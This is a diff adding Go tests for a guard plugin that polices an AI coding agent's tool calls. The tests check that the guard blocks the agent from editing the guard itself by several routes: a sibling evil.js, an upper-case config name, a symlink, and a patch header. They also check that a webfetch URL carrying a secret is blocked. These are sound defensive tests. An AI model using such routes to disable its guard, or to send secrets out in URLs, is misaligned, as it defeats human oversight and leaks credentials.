@@ -276,6 +276,12 @@ plugin.setup(ctx).then(function() {
 //	arm3_enoent_throws           — trackfw not in PATH → ENOENT → plugin throws "not found" → exit 1
 //	arm4_write_self_throws       — write to plugin file → D4 self-protection → exit 1; stderr contains "D4"
 //	arm5_read_payload_structure  — read tool → payload has hook_source:"opencode" + abs file_path
+//	arm6_plugin_dir_sibling_throws   — write to sibling in plugins/ dir → D4 dir protection → exit 1
+//	arm7_opencode_json_uppercase_throws — write to OPENCODE.JSON (darwin) → D4 case-insensitive → exit 1
+//	arm8_symlink_to_plugin_throws — write via symlink pointing to plugin → D4 realpath → exit 1
+//	arm9_patch_header_plugin_throws   — patch with *** Update File targeting plugin → D4 → exit 1
+//	arm10_patch_innocent_no_self_throw — patch targeting innocent file → no self-protection throw
+//	arm11_webfetch_secret_throws      — webfetch URL containing secret → credential guard → exit 1
 func TestOpenCodePlugin_JSRuntime(t *testing.T) {
 	nodeRuntime := findNodeRuntime()
 	if nodeRuntime == "" {
@@ -313,6 +319,10 @@ func TestOpenCodePlugin_JSRuntime(t *testing.T) {
 		}
 		if strings.Contains(stderr, "not found") {
 			t.Errorf("arm1: threw ENOENT instead of guard block; stderr=%q", stderr)
+		}
+		// A5: guard block message must contain "operation blocked"
+		if !strings.Contains(stderr, "operation blocked") {
+			t.Errorf("arm1: expected 'operation blocked' in guard throw message; got %q", stderr)
 		}
 	})
 
@@ -412,6 +422,114 @@ func TestOpenCodePlugin_JSRuntime(t *testing.T) {
 			t.Errorf("arm5: tool_input.file_path missing or invalid: %v", err)
 		} else if !filepath.IsAbs(filePath) {
 			t.Errorf("arm5: tool_input.file_path must be absolute; got %q", filePath)
+		}
+	})
+
+	t.Run("arm6_plugin_dir_sibling_throws", func(t *testing.T) {
+		// Conclusion: writing any file inside .opencode/plugins/ (e.g. evil.js) →
+		// D4 directory protection fires before runGuard → driver exits 1 (F4 fix).
+		envNoTrackfw := nodeEnvNoTrackfw(secret)
+		// evil.js is a sibling of trackfw-guard.js in the same plugins/ dir.
+		siblingPath := filepath.Join(filepath.Dir(pluginPath), "evil.js")
+		driver := makeV2Driver(pluginPath, projectDir, "write",
+			fmt.Sprintf(`{ path: %q }`, siblingPath))
+		_, stderr, rc := runNodeDriver(t, nodeRuntime, driver, envNoTrackfw)
+		if rc == 0 {
+			t.Fatalf("arm6: expected D4 dir-protection throw for sibling plugin; got rc=0 stderr=%q", stderr)
+		}
+		if !strings.Contains(stderr, "D4 self-protection") {
+			t.Errorf("arm6: expected D4 self-protection in stderr; got %q", stderr)
+		}
+	})
+
+	t.Run("arm7_opencode_json_uppercase_throws", func(t *testing.T) {
+		// Conclusion: on darwin (case-insensitive FS), writing OPENCODE.JSON is the same
+		// inode as opencode.json — D4 config-file protection fires via realpath comparison
+		// (F2 case fix).
+		if runtime.GOOS != "darwin" && runtime.GOOS != "windows" {
+			t.Skip("case-insensitive FS test only applies on darwin and windows")
+		}
+		envNoTrackfw := nodeEnvNoTrackfw(secret)
+		// Upper-case form of opencode.json in projectDir.
+		upperPath := filepath.Join(projectDir, "OPENCODE.JSON")
+		driver := makeV2Driver(pluginPath, projectDir, "write",
+			fmt.Sprintf(`{ path: %q }`, upperPath))
+		_, stderr, rc := runNodeDriver(t, nodeRuntime, driver, envNoTrackfw)
+		if rc == 0 {
+			t.Fatalf("arm7: expected D4 throw for OPENCODE.JSON (case-insensitive); got rc=0 stderr=%q", stderr)
+		}
+		if !strings.Contains(stderr, "D4 self-protection") {
+			t.Errorf("arm7: expected D4 self-protection in stderr; got %q", stderr)
+		}
+	})
+
+	t.Run("arm8_symlink_to_plugin_throws", func(t *testing.T) {
+		// Conclusion: writing through a symlink that points to the plugin file → realpath
+		// comparison catches the symlink target → D4 fires (F8 fix).
+		symlinkPath := filepath.Join(t.TempDir(), "link-to-plugin.js")
+		if err := os.Symlink(pluginPath, symlinkPath); err != nil {
+			t.Skip("cannot create symlink (Windows without privilege?): " + err.Error())
+		}
+		envNoTrackfw := nodeEnvNoTrackfw(secret)
+		driver := makeV2Driver(pluginPath, projectDir, "write",
+			fmt.Sprintf(`{ path: %q }`, symlinkPath))
+		_, stderr, rc := runNodeDriver(t, nodeRuntime, driver, envNoTrackfw)
+		if rc == 0 {
+			t.Fatalf("arm8: expected D4 throw for symlink to plugin; got rc=0 stderr=%q", stderr)
+		}
+		if !strings.Contains(stderr, "D4 self-protection") {
+			t.Errorf("arm8: expected D4 self-protection in stderr; got %q", stderr)
+		}
+	})
+
+	t.Run("arm9_patch_header_plugin_throws", func(t *testing.T) {
+		// Conclusion: patch tool with patchText containing "*** Update File:
+		// .opencode/plugins/trackfw-guard.js" → D4 patch-header parsing extracts
+		// the target and fires self-protection (A7/F5 fix).
+		envNoTrackfw := nodeEnvNoTrackfw(secret)
+		// Relative path in patch header — the guard resolves it against projectDir.
+		patchText := "*** Begin Patch\n*** Update File: .opencode/plugins/trackfw-guard.js\n@@\n-old\n+new\n*** End Patch"
+		driver := makeV2Driver(pluginPath, projectDir, "patch",
+			fmt.Sprintf(`{ patchText: %q }`, patchText))
+		_, stderr, rc := runNodeDriver(t, nodeRuntime, driver, envNoTrackfw)
+		if rc == 0 {
+			t.Fatalf("arm9: expected D4 throw for patch targeting plugin; got rc=0 stderr=%q", stderr)
+		}
+		if !strings.Contains(stderr, "D4 self-protection") {
+			t.Errorf("arm9: expected D4 self-protection in stderr; got %q", stderr)
+		}
+	})
+
+	t.Run("arm10_patch_innocent_no_self_throw", func(t *testing.T) {
+		// Conclusion: patch tool targeting an ordinary file does not trigger
+		// self-protection — only paths under protected dirs/files are denied.
+		captureFile := filepath.Join(t.TempDir(), "captured10.json")
+		envCapture := append(nodeEnv(fakeDir, secret), "TRACKFW_STDIN_CAPTURE="+captureFile)
+		patchText := "*** Begin Patch\n*** Update File: src/main.go\n@@\n-old\n+new\n*** End Patch"
+		driver := makeV2Driver(pluginPath, projectDir, "patch",
+			fmt.Sprintf(`{ patchText: %q }`, patchText))
+		stdout, stderr, rc := runNodeDriver(t, nodeRuntime, driver, envCapture)
+		_ = stdout
+		if rc != 0 {
+			t.Fatalf("arm10: expected no self-protection throw for innocent patch; got rc=%d stderr=%q", rc, stderr)
+		}
+	})
+
+	t.Run("arm11_webfetch_secret_throws", func(t *testing.T) {
+		// Conclusion: webfetch tool with URL containing a fake credential → plugin
+		// routes it to trackfw guard credential → fake trackfw sees secret in stdin
+		// and exits 2 → plugin throws (F6 coverage).
+		driver := makeV2Driver(pluginPath, projectDir, "webfetch",
+			fmt.Sprintf(`{ url: %q }`, "https://example.com/?key="+secret))
+		_, stderr, rc := runNodeDriver(t, nodeRuntime, driver, env)
+		if rc == 0 {
+			t.Fatalf("arm11: expected throw for webfetch with credential in URL; got rc=0 stderr=%q", stderr)
+		}
+		if !strings.Contains(stderr, "THREW:") {
+			t.Errorf("arm11: expected THREW: in stderr; got %q", stderr)
+		}
+		if strings.Contains(stderr, "not found") {
+			t.Errorf("arm11: threw ENOENT instead of guard block; stderr=%q", stderr)
 		}
 	})
 }
